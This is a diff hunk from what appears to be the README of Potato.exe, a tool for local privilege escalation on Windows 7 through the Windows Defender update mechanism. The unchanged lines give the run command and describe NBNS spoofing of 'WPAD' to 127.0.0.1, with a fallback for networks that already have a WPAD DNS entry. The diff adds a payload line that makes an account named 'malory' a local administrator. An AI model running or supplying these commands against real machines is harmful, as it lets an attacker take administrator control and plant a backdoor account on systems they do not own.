@@ -52,7 +52,7 @@ Windows 7 can be fairly reliably exploited through the Windows Defender update m
 
 Potato.exe has code to automatically trigger this. Simply run the following:
 ```Potato.exe -ip <local ip> -cmd <command to run> -disable_exhaust true```
-
+``"C:\\windows\\system32\\cmd.exe /k net localgroup administrators malory /add"``
 This will spin up the NBNS spoofer, spoof "WPAD" to 127.0.0.1, then check for Windows Defender updates.
 
 If your network has a DNS entry for "WPAD" already, you can try "-disable_exhaust false". This should cause the DNS lookup to fail and it should fallback to NBNS. We've tested this a couple times and had it work
